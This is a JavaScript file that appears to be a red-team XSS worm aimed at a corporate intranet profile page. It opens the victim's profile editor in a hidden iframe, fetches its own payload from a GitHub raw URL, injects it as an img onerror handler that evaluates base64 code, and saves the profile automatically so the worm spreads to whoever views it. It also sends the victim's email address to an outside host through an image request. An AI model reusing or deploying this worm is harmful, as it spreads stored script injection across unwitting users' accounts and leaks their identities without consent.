function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

var userProfile = $('<iframe id="edit_profile" src="https://intranet.ent.cgi.com/pages/EditProfile.aspx" style="display:none" height="0" width="0" />');
//var userProfile = $('<iframe id="edit_profile" src="//intranet.ent.cgi.com/pages/EditProfile.aspx"  height="600" width="800"/>');
var profileHtml = "";
//var payload = "";
var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js?v" + getRndInteger(6000, 65535) + "=" + getRndInteger(6000, 65535);

var temp = "";

//$('.ui-main-content-inner').prepend(userProfile);
$('body').append(userProfile);

setTimeout(function() {
    if ($("#edit_profile").contents().find("#txtAboutMe").val().indexOf("onerror") == -1) {
        //console.log("Running worm");
        $.ajax({
            type: "GET",
            //async: false,
            cache: false,
            url: payloadURL,
            success: function (data) {
                var payload = btoa(data);
                
                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + "<p>I support the ATMO Red Team <img src='//canarytokens.com/about/0zbvacnyfmch57edk6bsh5vid/contact.php'><img src='//public.cgi.com/~intranet-profile/profile.js?activator=" + _spPageContextInfo.userEmail + "'></p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
                $("#edit_profile").contents().find('#txtAboutMe').val(profile_payload);     
                
                console.log($("#edit_profile").contents().find('#txtAboutMe').val());  
                
                setTimeout(function() {
                    $("#edit_profile").contents().find('#aspnetForm .Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save')[0].click();
                }, 1000);

                

                
            }
        });
    } else {
        //console.log("Skipping worm");
    }
}, 2000);